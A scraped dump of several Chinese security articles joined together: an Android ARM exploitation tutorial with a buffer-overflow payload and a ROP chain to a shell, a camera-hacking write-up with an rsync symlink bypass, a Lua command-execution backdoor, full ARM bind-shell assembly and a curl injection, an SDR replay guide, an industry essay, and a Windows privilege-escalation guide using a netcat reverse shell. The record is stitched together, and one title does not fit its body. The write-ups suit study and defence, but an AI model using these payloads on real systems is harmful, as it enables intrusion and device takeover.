你可以访问http://www.duosecurity.com/blog/exploit-mitigations-in-android-jelly-bean-4-1 了解所有 Android 安全实施。echo 0 &gt; /proc/sys/kernel/randomize_va_spacegcc -g buffer_overflow.c -o buffer_overflow接下来，我们可以简单将二进制文件加载到 GNU 调试器，简称 GDB，然后开始调试它，如下面的命令所示：gdb -q buffer_overflow现在我们可以使用 disass 命令来反汇编特定的函数，这里是 ShouldNotBeCalled，如下面的截图所示：正如我们在上面的截图中可以看到的，ShouldNotBeCalled 函数从内存地址0x00008408 开始。 如果我们查看 main 函数的反汇编，我们看到漏洞函数在0x000084a4 被调用并在 0x000084a8 返回。 因此，由于程序进入漏洞函数并使用易受攻击的 strcpy，函数不检查要复制的字符串的大小，并且如果我们能够在程序进入漏洞函数时控制子过程的 LR ，我们就能够控制整个程序流程。这里的目标是估计何时 LR 被覆盖，然后放入 ShouldNotBeCalled 的地址，以便调用 ShouldNotBeCalled 函数。 让我们开始使用一个长参数运行程序，如下面的命令所示，看看会发生什么。 在此之前，我们还需要在漏洞函数和 strcpy 调用的地址设置断点。b vulnerable b *一旦我们设置了断点，我们可以使用参数 AAAABBBBCCCC 来运行我们的程序，看看它是如何被覆盖的。 我们注意到它在漏洞函数的调用处命中了第一个断点，之后在 strcpy 调用处命中了下一个断点。 一旦它到达断点，我们可以使用 x 命令分析堆栈，并指定来自 SP 的地址，如下面的截图所示：我们可以看到，堆栈已经被我们输入的缓冲区覆盖（ASCII：41 代表 A，42 代表 B，等等）。 从上面的截图中，我们看到，我们仍然需要四个更多的字节来覆盖返回地址，在这种情况下是 0x000084a8。所以，最后的字符串是 16 字节的垃圾，然后是 ShouldNotBeCalled 的地址，如下面的命令所示：r `printf ""AAAABBBBCCCCDDDD\x38\x84""`我们可以在下面的截图中看到，我们已经将 IShouldNeverBeCalled 的起始地址添加到了参数中：请注意，由于这里是小端结构，字节以相反的顺序写入。 一旦我们运行它，我们可以看到程序 ShouldNotBeCalled 函数被调用，如下面的截图所示：8.4 返 回 导 向 编 程在大多数情况下，我们不需要调用程序本身中存在的另一个函数。 相反，我们需要在我们的攻击向量中放置 shellcode，这将执行我们在 shellcode 中指定的任何恶意操作。 但是，在大多数基于 ARM 平台的设备中，内存中的区域是不可执行的，这会阻止我们放置并执行 shellcode。因此，攻击者必须依赖于所谓的返回导向编程（ROP），它是来自内存不同部分的指令片段的简单链接，最终它会执行我们的 shellcode。 这些片段也称为 ROP gadget。 为了链接 ROP gadget，我们需要找到存在跳转指令的 gadget，这将允许我们跳到另一个位置。例如，如果我们在执行程序时反汇编 seed48()，我们将注意到以下输出：]如果我们查看反汇编，我们将注意到它包含一个 ADD 指令，后面跟着一个 POP 和 BX 指令，这是一个完美的 ROP gadget。 这里，攻击者可能会想到，为了将其用作 ROP gadget，首先跳到控制 r4 的 POP 指令，然后将比 /bin/sh的地址小 6 的值放入 r4 中，将 ADD 指令的值放入 LR 中。 因此，当我们跳回到 ADD 也就是 R0 = R4 + 6 时，我们就拥有了 /bin/sh 的地址，然后我们可以为 R4 指定任何垃圾地址并且为 LR 指定 system() 的地址。这意味着我们将最终跳转到使用参数 /bin/sh 的 system()，这将执行 shell。 以同样的方式，我们可以创建任何 ROP gadget，并使其执行我们所需要的任何东西。 由于 ROP 是开发中最复杂的主题之一，因此强烈建议你自己尝试，分析反汇编代码并构建漏洞。8.5 Android root 利 用从早期版本的 Android 开始，Android root 漏洞开始出现于每个后续版本和不同的 Android 设备制造商的版本中。 Android root 简单来说是获得对设备的访问特权，默认情况下设备制造商不会将其授予用户。 这些 root 攻击利用了 Android 系统中存在的各种漏洞。 以下是其中一些的列表，带有漏洞利用所基于的思想：Exploid：基于 udev 中的 CVE-2009-1185 漏洞，它是 Android 负责 USB 连接的组件，它验证 Netlink 消息（一种负责将 Linux 内核与用户连接的消息）是否源自原始来源或是由攻击者伪造。因此，攻击者可以简单地从用户空间本身发送 udev 消息并提升权限。Gingerbreak：这是另一个漏洞，基于 vold 中存在的漏洞，类似于 Exploid 中的漏洞。RageAgainstTheCage：此漏洞利用基于 RLIMIT_NPROC，它指定在调用 setuid 函数时可为用户创建的进程的最大数目。 adb 守护程序以 root 身份启动;然后它使用 setuid() 调用来解除特权。但是，如果根据 RLIMIT_NPROC 达到了最大进程数，程序将无法调用 setuid() 来解除特权，adb 将继续以 root 身份运行。Zimperlich：使用与 RageAgainstTheCage 的相同概念，但它依赖于 zygote 进程解除 root 权限。KillingInTheNameOf：利用了一个称为 ashmem（共享内存管理器）接口的漏洞，该漏洞用于更改 ro.secure 的值，该值确定设备的 root 状态。这些是一些最知名的 Android 漏洞利用，用于 root Android 设备。总 结在本章中，我们了解了 Android 利用和 ARM 利用的不同方式。 希望本章对于任何想要更深入地利用 ARM 的人来说，都是一个好的开始。在下一章中，我们将了解如何编写 Android 渗透测试报告。","2017-03-03 22:39:35","移动安全","Android 渗透测试学习手册（八）ARM 利用","http://nsoad.com/Article/MobileSecurity/20170303/1093.html"
"5ccbfaee4f2f0a0a7a69c0e7","闲来无事，买了一个某品牌的摄像头来 pwn 着玩（到货第二天就忙成狗了，flag 真是立的飞起）。 本想挖一挖二进制方面的漏洞，但是死性不改的看了下 Web，通过一个完整的攻击","silence","闲来无事，买了一个某品牌的摄像头来 pwn 着玩（到货第二天就忙成狗了，flag 真是立的飞起）。 本想挖一挖二进制方面的漏洞，但是死性不改的看了下 Web，通过一个完整的攻击链获取到这款摄像头的 root 权限，感觉还是很有意思的。0x00配置好摄像头连上内网后，首先习惯性的用 nmap 扫描了一下端口。&gt;&gt;&gt; ~ nmap 192.168.1.101 -n -v --openStarting Nmap 7.12 ( https://nmap.org ) at 2016-11-01 12:13 CST  Initiating Ping Scan at 12:13  Scanning 192.168.1.101 [2 ports]  Completed Ping Scan at 12:13, 0.01s elapsed (1 total hosts)  Initiating Connect Scan at 12:13  Scanning 192.168.1.101 [1000 ports]  Discovered open port 80/tcp on 192.168.1.101  Discovered open port 554/tcp on 192.168.1.101  Discovered open port 873/tcp on 192.168.1.101  Discovered open port 52869/tcp on 192.168.1.101  Completed Connect Scan at 12:13, 0.35s elapsed (1000 total ports)  Nmap scan report for 192.168.1.101  Host is up (0.051s latency).  Not shown: 996 closed ports  PORT      STATE SERVICE  80/tcp    open  http  554/tcp   open  rtsp  873/tcp   open  rsync  52869/tcp open  unknownRead data files from: /usr/local/bin/../share/nmap  Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds  除了 554、80，居然发现了一个 873 端口。873 是 rsync 的端口，一个摄像头居然开启了这个端口，感觉到十分的费解。 查看了下 rsync 的目录，发现有密码，暂时搁置。&gt;&gt;&gt; ~ rsync 192.168.1.101::                                                                             12:22:03usb             rsync_mgr  nas             rsync_mgr  &gt;&gt;&gt; ~ rsync 192.168.1.101::nas                                                                          12:22:06Password:  @ERROR: auth failed on module nasrsync error: error starting client-server protocol (code 5) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-51/rsync/main.c(1402) [receiver=2.6.9]  Web 端黑盒没有分析出漏洞，同样暂时搁置。 不过暂时发现有意思的一点，这个摄像头可以挂载 NFS。0x01下面着手分析固件。 在官网下载固件后，用 firmware-mod-kit 解包。/home/httpd 存放着 Web 所有的文件，是 lua 字节码。file 一下发现是 lua-5.1 版本的。 利用 unluac.jar 解码得到 Web 源码。 本以为会有命令执行等漏洞，因为会有 NFS 挂载的过程。但是并没有找到所谓的漏洞存在。 同时看了下 rsync 配置文件，发现密码为 ILove****：但是尝试查看内容的时候提示 chdir faild，难道说这个文件不存在？&gt;&gt;&gt; ~/D/httpd rsync rsync@192.168.1.101::nas --password-file /tmp/p@ERROR: chdir failedrsync error: error starting client-server protocol (code 5) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-51/rsync/main.c(1402) [receiver=2.6.9]  突然有个猜想划过脑海。于是我搭建了一个 NFS 服务器，然后配置好摄像头 NFS：再次运行 rsync：&gt;&gt;&gt; ~/D/httpd rsync rsync@192.168.1.101::nas --password-file /tmp/pdrwxrwxrwx        4096 2016/11/01 12:35:47 .  drwxr-xr-x        4096 2016/11/01 12:35:47 HN1A009G9M12857  Bingo！0x02rsync 目录限制在 /mnt/netsrv/nas 了，如何绕过呢。 symbolic link 来帮你_(:3」∠)_ 愚蠢的 rsync 并没有设置 chroot，于是我可以直接创建一个指向 / 的符号链接，然后可以访问任意目录。&gt;&gt;&gt; ~/D/httpd rsync --password-file /tmp/p rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/drwxr-xr-x         216 2016/07/23 11:28:55 .  lrwxrwxrwx          11 2016/07/23 11:28:43 linuxrc  lrwxrwxrwx           9 2016/07/23 11:28:55 tmp  drwxr-xr-x         971 2016/07/23 11:28:56 bin  drwxrwxrwt       10620 1970/01/01 08:00:10 dev  drwxr-xr-x         603 2016/07/23 11:28:55 etc  drwxr-xr-x          28 2016/07/23 11:28:43 home  drwxr-xr-x        1066 2016/07/23 11:28:56 lib  drwxr-xr-x          60 2016/07/23 11:27:31 mnt  dr-xr-xr-x           0 1970/01/01 08:00:00 proc  drwxr-xr-x         212 2016/07/23 11:28:56 product  drwxr-xr-x           3 2016/07/23 11:27:31 root  drwxr-xr-x         250 2016/07/23 11:28:43 sbin  drwxr-xr-x           0 1970/01/01 08:00:01 sys  drwxr-xr-x          38 2016/07/23 11:27:31 usr  drwxr-xr-x          50 2016/07/23 11:28:55 var  正当我愉快的打算 rsync 一个 lua 的 shell 到上面时，却发现除了/tmp/，整个文件系统都不可写。 嘛，没关系，我们还有 Web 源码可以看。local initsession = function()    local sess_id = cgilua.remote_addr  if sess_id == nil or sess_id == """" then    g_logger:warn(""sess_id error"")    return  end  g_logger:debug(""sess_id = "" .. sess_id)  setsessiondir(_G.CGILUA_TMP)  local timeout = 300  local t = cmapi.getinst(""OBJ_USERIF_ID"", """")  if t.IF_ERRORID == 0 then    timeout = tonumber(t.Timeout) * 60  end  setsessiontimeout(timeout)  session_init(sess_id)  return sess_idend  initsession 函数创建了一个文件名为 IP 地址的 session，文件储存在 /tmp/lua_session&gt;&gt;&gt; ~/D/httpd rsync --password-file /tmp/p rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/tmp/lua_session/drwxrwxr-x          60 2016/11/01 12:11:12 .  -rw-r--r--         365 2016/11/01 12:35:55 192_168_1_100.lua同步回来，加一句 os.execute(cgilua.POST.cmd);，然后同步回去。 看起来已经成功执行了命令。但是我尝试了常见的 whoami、id 等命令，发现并不存在，通过 sh 反弹 shell 也失败了。感觉很尴尬2333330x03通过收集部分信息得知摄像头为 ARM 架构，编写一个 ARM 的 bind shell 的 exp：void main()  {    asm(    ""mov %r0, $2\n""    ""mov %r1, $1\n""    ""mov %r2, $6\n""    ""push {%r0, %r1, %r2}\n""    ""mov %r0, $1\n""    ""mov %r1, %sp\n""    ""svc 0x00900066\n""    ""add %sp, %sp, $12\n""    ""mov %r6, %r0\n""    "".if 0\n""    ""mov %r0, %r6\n""    "".endif\n""    ""mov %r1, $0x37\n""    ""mov %r7, $0x13\n""    ""mov %r1, %r1, lsl $24\n""    ""add %r1, %r7, lsl $16\n""    ""add %r1, $2\n""    ""sub %r2, %r2, %r2\n""    ""push {%r1, %r2}\n""    ""mov %r1, %sp\n""    ""mov %r2, $16\n""    ""push {%r0, %r1, %r2}\n""    ""mov %r0, $2\n""    ""mov %r1, %sp\n""    ""svc 0x00900066\n""    ""add %sp, %sp, $20\n""    ""mov %r1, $1\n""    ""mov %r0, %r6\n""    ""push {%r0, %r1}\n""    ""mov %r0, $4\n""    ""mov %r1, %sp\n""    ""svc 0x00900066\n""    ""add %sp, $8\n""    ""mov %r0, %r6\n""    ""sub %r1, %r1, %r1\n""    ""sub %r2, %r2, %r2\n""    ""push {%r0, %r1, %r2}\n""    ""mov %r0, $5\n""    ""mov %r1, %sp\n""    ""svc 0x00900066\n""    ""add %sp, %sp, $12\n""    ""mov %r6, %r0\n""    ""mov %r1, $2\n""    ""1:  mov %r0, %r6\n""    ""svc 0x0090003f\n""    ""subs %r1, %r1, $1\n""    ""bpl 1b\n""    ""sub %r1, %sp, $4\n""    ""sub %r2, %r2, %r2\n""    ""mov %r3, $0x2f\n""    ""mov %r7, $0x62\n""    ""add %r3, %r7, lsl $8\n""    ""mov %r7, $0x69\n""    ""add %r3, %r7, lsl $16\n""    ""mov %r7, $0x6e\n""    ""add %r3, %r7, lsl $24\n""    ""mov %r4, $0x2f\n""    ""mov %r7, $0x73\n""    ""add %r4, %r7, lsl $8\n""    ""mov %r7, $0x68\n""    ""add %r4, %r7, lsl $16\n""    ""mov %r5, $0x73\n""    ""mov %r7, $0x68\n""    ""add %r5, %r7, lsl $8\n""    ""push {%r1, %r2, %r3, %r4, %r5}\n""    ""add %r0, %sp, $8\n""    ""add %r1, %sp, $0\n""    ""add %r2, %sp, $4\n""    ""svc 0x0090000b\n""    );}编译：arm-linux-gcc 2.c -o 2 -static  通过 rsync 扔到 /tmp 目录，然后跑起来：rsync --password-file /tmp/p 2 rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/tmp/  curl http://192.168.1.101 --data ""cmd=wget%20192.168.1.100:2333/`/tmp/2%26`""  连接 4919 端口：\","2016-11-02 16:00:53","系统安全","Pwn A Camera Step by Step (Web ver.)","http://nsoad.com/Article/system/20161102/679.html"
"5ccbfaee4f2f0a0a7a69c0e8","*本文作者：雪碧0xroot@ 漏洞盒子安全团队，转载须注明来自FreeBuf.COM0&times;00 前言前段时间在《HackRF入门：家用无线门铃信号重放》 一文中通过HackRF录制、重放了无线","blackhold","*本文作者：雪碧0xroot@ 漏洞盒子安全团队，转载须注明来自FreeBuf.COM0×00 前言前段时间在《HackRF入门：家用无线门铃信号重放》 一文中通过HackRF录制、重放了无线遥控信号，不过一直没来得及对信号进行分析，刚好在国外网站看到有大牛对遥控信号进行了分析（详见refer部分）。在这里便按照国外大牛分析无线遥控信号的方法来依葫芦画瓢。*本文仅分享信号分析方式，因信号调制编码方式有所不同，如数据分析有出错，希望大家不要打我=￣ω￣= 摸摸大0×01 环境搭建Mac可使用port(/www.macports.org) 或者brew(brew.sh)安装GnuRadio依赖套件:sudo port install gnuradiosudo port install hackrfsudo port install rtl-sdrsudo port install gr-osmosdr gqrxsudo port install hackrf完成上面的工作后便能在Mac环境中使用电视棒、HackRF、GnuRadio了。    0×02 Recording 信号录制录制遥控信号的方式有很多，如电视棒+SDR-sharp录制wav音频格式数据、通过HackRF命令终端录制RAW格式数据，本文使用GNURadio+SDR硬件（rtl-sdr、HackRF、BladeRF等）来实现这一功能：左侧RTL-SDR Source将使用SDR硬件接收315MHz无线信号,采样率为2M，右上WX GUI Waterfall sink将接收到的信号通过瀑布图在PC上显示捕获的无线信号，右下角File Sink将捕获到的无线数据包储存到/tmp/test.cfile文件中。执行流图并摁下遥控可看到如下效果图：个人比较喜欢使用gr-fosphor的瀑布图模块来对捕获到的信号在瀑布图上进行展示：结束GnuRadio流图后，查看/tmp目录下的test.cfile:0×03 Analysis 信号分析分析信号可使用音频处理软件Audacity：不过这种方式需要肉眼将波形转化成0跟1，看起来比较容易眼花。maybe，只有老司机才能很快很准确地用这种方式完成分析任务。3.1 安装inspectrum在这篇文章中我们将通过inspectrum(https://github.com/miek/inspectrum)这个工具来分析信号，配合Python将信号转成二进制数据。sudo port install fftw-3-single cmake pkgconfig qt5git clone https://github.com/miek/inspectrum.gitmkdir buildcd buildcmake ..makesudo make installinspectrum -hUsage: inspectrum [options] filespectrum viewerOptions:  -h, --help       Displays this help.  -r, --rate   Set sample rate.Arguments:  file             File to view.3.2 数据导入、分析inspectrum /tmp/test.cfile 通过左侧Spectrogram参数的调节、缩放工具，我们可以实现波形图的放大缩小，颜色深浅调节：下方Time selection可对波形进行划分：    对Symbols进行递增，直至囊括一个信号波形区域：右键—&gt;Add derved plot—&gt;Add amplitude plot:    效果如下：    对部分参数进行微调：    导出波形数据：此时在终端获得波形宽度数据：    3.3 解码接下来我们可通过Python将这些数据转成0、1,，test.py代码如下：（if i &gt; x  x的值根据自身实际情况决定，建议取最大值跟最小值区间的自然数）s = ''a = [0.121182, 0.00224696, 0.00227361, 0.00222253, 0.121036, 0.121293, 0.12126, 0.00220722, 0.121013, 0.00221486, 0.00230146, 0.00230048, 0.120959, 0.120975, 0.12077, 0.00227199, 0.120701, 0.00226761, 0.00234306, 0.00225335, 0.120851, 0.120784, 0.12084, 0.00224014, 0.120892, 0.00221627, 0.00222881, 0.00219768, 0.121157, 0.00224349, 0.00221741, 0.00223827, 0.120798, 0.00237988, 0.00226093, 0.00232855, 0.120649, 0.120813, 0.121032, 0.00222553, 0.120876, 0.00221533, 0.00225347, 0.00228226, 0.120759, 0.120718, 0.12042, 0.00218557, 0.120344, 0.00222487, 0.00224753, 0.00227552, 0.120383, 0.120384, 0.120275, 0.00224362, 0.120611, 0.00219556, 0.00227022, 0.00224123, 0.120514, 0.120328, 0.12068, 0.0022916, 0.120735, 0.12043, 0.120697, 0.00224807, 0.120399, 0.120808, 0.120405, 0.00222214, 0.120512, 0.120833, 0.120495, 0.00226469, 0.120727, 0.120617, 0.120534, 0.00222499, 0.120441, 0.120626, 0.120297, 0.00208249, 0.120539, 0.120365, 0.120612, 0.00214876, 0.120545, 0.120262, 0.120739, 0.00228899, 0.12051, 0.120525, 0.120172, 0.00214644, 0.120678] for i in a:    if i &gt; 0.03:        s +='1'    else:        s +='0'0×04 replay 信号重放通过上述方式，我们已对SDR捕获到的无线信号进行分析，并把信号文件转换成了二进制数据，接下来可使用GnuRadio对数据进行重放、修改测试，或者使用RFcat+Python实现廉价的重放Hacking。0×05 referhttps:[email protected]/*  */[email protected]/*  */ncrr3Mike Walters: Reversing digital signals with inspectrum – YouTubeMy quickest and easiest method for OOK signal decoding &amp; replication in 2016 – YouTube*本文作者：雪碧0xroot@ 漏洞盒子安全团队，转载须注明来自FreeBuf.COM","2016-08-18 09:22:27","无线安全","如何使用SDR+inspectrum逆向分析无线遥控信号","http://nsoad.com/Article/wifi/20160818/311.html"
"5ccbfaee4f2f0a0a7a69c0e9","前言所有的行业生态体系都会经历洗牌的过程，老的市场格局被打破，新的市场被重新分配，这是个永恒不变的定律，所谓的颠覆和创新只不过是行业发展到一定阶段的必然产物。所","Kong","前言所有的行业生态体系都会经历洗牌的过程，老的市场格局被打破，新的市场被重新分配，这是个永恒不变的定律，所谓的颠覆和创新只不过是行业发展到一定阶段的必然产物。所以在行业洗牌过后成为赢家的公司,与其说是创造了一种新的商业模式或者产品形态，不如说是他们顺应了时代的发展，抓住机会，在洗牌的过程后最后成为了时代的赢家。作为一名网络信息安全从业人员，因为工作的原因接触越来越多的客户，安全合作厂商，安全产品，系统集成商，最近越来越强烈的感觉到企业信息安全行业的洗牌在加速。不过与其用“洗牌”这个词，还不如用“融合”和“改变”这两个词或许更好一些，因为所有的事情都是因为“势”来了，行业和市场最后会留下来的都是那些很好的融合和改变的玩家。假如整个企业安全市场是一桌麻将的话，那么今天的玩家就是云计算厂商，传统企业安全厂商，互联网甲方中的乙方安全公司（有可能是bat公司里的安全部门）以及行业集成商（ISV）。大家手里的牌怎么打，怎么洗很关键，所有人都希望在洗完之后手里能有一副好牌继续在桌子上玩，那么我们下面看看都哪些牌会被洗。1.安全产品的变化产品形态的变化：在云计算发展如火如荼的今天，硬件盒子已经慢慢的开始被淘汰，传统的工程师界面的安全产品硬件慢慢被虚拟化适应云平台和SaaS服务化两种形式产品取代。安全产品和服务作为云计算平台的一种附加属性越来越重要，而且随着业务的发展，慢慢开始从IaaS层的安全扩展到业务层上。越来越多的公司把业务迁移到公有云上，因为越来越多的传统企业终于明白互联网的玩法和套路了。他们也学会用大数据和人工智能去搞工业制造、金融、银行等这些传统行业，对应的，越来越多的业务风险和安全就凸显出来，所以业务风控，移动安全这些新的产品形态也越来越多。简单易用，容易交付这个关键的点让客户开始慢慢接受虚拟化的产品和服务。那么云计算平台安全产品边界在哪里？我个人的观点，云平台应该只做以下两种类型的产品，其他的都应该交给安全合作伙伴来做。1.资源消耗性的安全产品 （基于IaaS层的如DDoS防御这种），这种产品只有云厂商（bat）具有丰富的带宽储备，可以做到超卖，充分利用正常业务带来的带宽红利来抵消大流量攻击带来的防御支出。2.平台型安全产品，基于云平台产品自身API外延的基础设施型产品，比如数据库服务是云平台自己该做的，但是基于数据库的业务相关的安全审核和加密一类个性化的需求应该完全交给安全合作伙伴来做；再比如类似SIEM和MSSP类的产品，云平台只要提供最基础的API接口和接入标准，让有个性化要求的客户和安全厂商能通过这些平台接口来做业务扩展，而最后平台售卖的还是平台的基础能力和基本安全数据接口。2.安全公司的变化传统安全公司被并购：未来安全领域有可能会诞生非专科医院类型的，普惠型体检中心的产品，但是目前来看大部分的安全公司能占据的市场和云计算市场一比还是非常小众，所以后续会有越来越多的安全公司，要么被云计算厂商并购，要么被互联网甲方公司并购。无论是谁，收购这些安全公司目的只有两个：1.用来弥补平台本身在某些安全领域里的不足，弥补短板。2.用来在云平台或者互联网甲方公司的业务环境里培养新的安全产品出来，可能这个产品本身在技术和体验上会有一些变化。但是最关键的变化是因为平台和甲方本身海量的数据业务而带来的产品巨大的变化，这种变化是质变，因为原有的乙方产品没有经历过中国互联网企业极其复杂的恶劣生存环境。3.安全从业人员的变化我认为，最好的安全公司未来人员结构是这样的：上层：传统安全公司出身的销售，市场，售前一类的商业人才（来自传统安全厂商乙方）中层：负责管理线上销售运营（来自互联网甲方）和负责管理安全渠道（来自传统安全厂商乙方）底层：安全产品，技术，安全运营技术人员（来自互联网甲方）今天大部分的创业公司要么是有很好的从乙方出来的销售市场人才，懂客户，懂行业，懂业务规则，但是没有在甲方的产品技术；要么就是从甲方出来很牛的产品技术，但是又不懂乙方市场和销售。所以未来的发展趋势是通过并购或者人才转移的方式，乙方上层的人才会转移到甲方的公司里，这个甲方有可能是云计算公司，有可能是互联网公司里的安全部。因为互联网公司的安全部一群人大部分是从保障公司业务安全稳定开始起家的，对孵化出来的产品如何商业化，如何打市场是不在行的，而乙方的这些销售又没有卖过上亿级别访问量的互联网安全产品，所以甲方和乙方在业务和产品上能做好非常好的互补和“融合”。通过最终的“融合”会产生新的一类公司，从甲方的乙方里再出来的乙方公司，比如bat里的安全部再分拆出来成为服务于海量客户级别的互联网安全产品公司。而这类公司的出现，就是因为顺应了时代的变化，互联网+业务的兴起和云计算被企业的认可。4.安全市场的变化因为安全产品的变化，原来的安全产品代理商，渠道也在寻求改变。因为未来产品的售卖方式可能最后会演变为appstore的模式，即便在中间的过度阶段，这些行业的代理商，集成商和ISV们仍然因为收入问题而对在线模式非常抵触。但是相信未来，企业一定是通过企业商店的模式去采购和下单，而这些代理商们需要从纯业务销售转变为服务销售，不是仅仅卖产品，更多的可能是以服务的形式来填补因为产品价格空间降低而减少的利润。其实这些人是整个行业生态中最关键的部分，因为只有他们最接近客户的业务，他们也是未来平台型安全产品的使用者和推动者。另外整个安全市场是保持增长的趋势，原因很简单，就是我之前提到的原来传统企业不做互联网，转而做互联网+了；然后安全是服务于业务的，有了业务就有安全市场，所以未来安全产品的客单价会降低，但是客户量会增加；而对应的产品可定制化可能会越来越行业化，专业化，小众化，越来越多的安全需求趋于通用化，我相信这会是安全行业产品最大的一次变革。也许到那个时候，安全产品真的可以是大众汽车，而不是今天中小企业都用不起的保时捷了，而这一切的前提是基于云计算大数据和人工智能培养出来的服务于海量客户级别的互联网安全公司的产品。","2016-11-03 18:24:45","安全管理","信息安全行业洗牌观察记","http://nsoad.com/news/securityissue/20161103/690.html"
"5ccbfaee4f2f0a0a7a69c0ea","商业无人机和无线电遥控飞机日益受到关注，商业航空公司害怕发生碰撞，无人机的购买者害怕隐私受到侵犯。另一个风险是无人机在飞行的过程中可能受到劫持或人为干扰","Kong","从t7到t10 - 撸起袖子大干一场到现在这个阶段，我希望我们已经有了一个SYSTEM的shell，但是如果我们还没有，仍有一些其它的途径去获得SYSTEM权限。在这个最后的部分，我们将目光投向Windows的服务和文件及文件夹权限。我们的目标是使用弱权限（权限的错误配置）来提升权限。我们将检查大量的访问权限，所以我们可以在微软的Sysinternals工具包中拷贝accesschk.exe来使用。“Microsoft Sysinternals”包含了大量优秀的工具，非常遗憾，微软没有将它们放在Windows自带工具中。你可以从这里下载[这里]。我们将从Windows服务下手，因为往往一些立竿见影的东西会在这里被发现。通常，现在的操作系统不会存在有漏洞的服务，所以，有漏洞的意思是我们可以再次配置某个服务的参数。Windwos的服务就像是软件的快捷方式，现在举个栗子：我们可以使用sc去查询，配置，和管理Windows服务C:\Windows\system32&gt; sc qc Spooler [SC] QueryServiceConfig SUCCESSSERVICE_NAME: SpoolerTYPE               : 110  WIN32_OWN_PROCESS (interactive)START_TYPE         : 2   AUTO_STARTERROR_CONTROL      : 1   NORMALBINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exeLOAD_ORDER_GROUP   : SpoolerGroupTAG                : 0DISPLAY_NAME       : Print SpoolerDEPENDENCIES       : RPCSS                    : httpSERVICE_START_NAME : LocalSystem我们可以使用accesschk来检查每个服务需要的权限：我们可以看到每个用户拥有的权限。你可以使用“accesschk.exe -ucqv *”来列出所有的服务。C:\&gt; accesschk.exe -ucqv SpoolerSpooler  R  NT AUTHORITY\Authenticated Users        SERVICE_QUERY_STATUS        SERVICE_QUERY_CONFIG        SERVICE_INTERROGATE        SERVICE_ENUMERATE_DEPENDENTS        SERVICE_USER_DEFINED_CONTROL        READ_CONTROL  R  BUILTIN\Power Users        SERVICE_QUERY_STATUS        SERVICE_QUERY_CONFIG        SERVICE_INTERROGATE        SERVICE_ENUMERATE_DEPENDENTS        SERVICE_START        SERVICE_USER_DEFINED_CONTROL        READ_CONTROL  RW BUILTIN\Administrators        SERVICE_ALL_ACCESS  RW NT AUTHORITY\SYSTEM        SERVICE_ALL_ACCESSAccesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。确保你没有搞错，你的用户属于哪个用户组，举个栗子，“Power Users”被认为是一个低权限用户组（它使用的不多）让我们将Windows 8 和 Windows XP SP0的输出进行对比：Windows 8： C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv ""Authenticated Users"" * No matching objects found.在默认的Windwos XP SP0，我们可以看到，有一个超级大的系统缺陷：C:\&gt; accesschk.exe -uwcqv ""Authenticated Users"" * RW SSDPSRV         SERVICE_ALL_ACCESS RW upnphost         SERVICE_ALL_ACCESS C:\&gt; accesschk.exe -ucqv SSDPSRV SSDPSRV   RW NT AUTHORITY\SYSTEM         SERVICE_ALL_ACCESS   RW BUILTIN\Administrators         SERVICE_ALL_ACCESS   RW NT AUTHORITY\Authenticated Users         SERVICE_ALL_ACCESS   RW BUILTIN\Power Users         SERVICE_ALL_ACCESS   RW NT AUTHORITY\LOCAL SERVICE         SERVICE_ALL_ACCESS C:\&gt; accesschk.exe -ucqv upnphost upnphost   RW NT AUTHORITY\SYSTEM         SERVICE_ALL_ACCESS   RW BUILTIN\Administrators         SERVICE_ALL_ACCESS   RW NT AUTHORITY\Authenticated Users         SERVICE_ALL_ACCESS   RW BUILTIN\Power Users         SERVICE_ALL_ACCESS   RW NT AUTHORITY\LOCAL SERVICE         SERVICE_ALL_ACCESS这个问题随后在XP SP2就被修复了。然而在SP0和SP1 ，它可以被用来作为通用的本地权限提升漏洞，通过对服务的重新配置，我们可以让它使用SYSTEM权限运行任何我们选择的可执行文件。让我们看下在实践中是怎么做的，在这种情况下，这个服务将执行netcat并且使用SYSTEM权限反弹一个shell。C:\&gt; sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost         TYPE               : 20  WIN32_SHARE_PROCESS         START_TYPE         : 3   DEMAND_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : Universal Plug and Play Device Host         DEPENDENCIES       : SSDPSRV         SERVICE_START_NAME : NT AUTHORITY\LocalService C:\&gt; sc config upnphost binpath= ""C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"" [SC] ChangeServiceConfig SUCCESS C:\&gt; sc config upnphost obj= "".\LocalSystem"" password= """" [SC] ChangeServiceConfig SUCCESS C:\&gt; sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost         TYPE               : 20  WIN32_SHARE_PROCESS         START_TYPE         : 3   DEMAND_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : Universal Plug and Play Device Host         DEPENDENCIES       : SSDPSRV         SERVICE_START_NAME : LocalSystem C:\&gt; net start upnphost我们不是总是对一个服务有完全的访问权限，尽管它被错误的配置了。下面的图是从Brett Moore's那里扒来的，任何一个下图的访问权限都将给我们一个SYSTEM权限的shell。记住我们目前的用户属于哪个用户组是很重要的，就像前面提到的“Power Users“,其实就是一个低权限的用户组。“Power Users”有它自己相关的一系列漏洞，Mark Russinovich曾经写过一篇关于“Power Users“的很有意思的文章。[The Power in Power Users (Mark Russinovich) - here]最后，我们将测试文件和文件夹的权限，如果我们不能直接攻击操作系统进行提权，那么我们可以让操作系统做一些事来帮助我们提权，这个涵盖的方面太多了，所以我在这里演示两种权限提升漏洞和利用它们的方式。一旦你掌握了核心方法，就将可以在其它的情况中应用这些方法。对于我们的第一个例子，我将复现Parvez的做法，他曾写过《Elevating privileges by exploiting weak folder permissions》，[Elevating privileges by exploiting weak folder 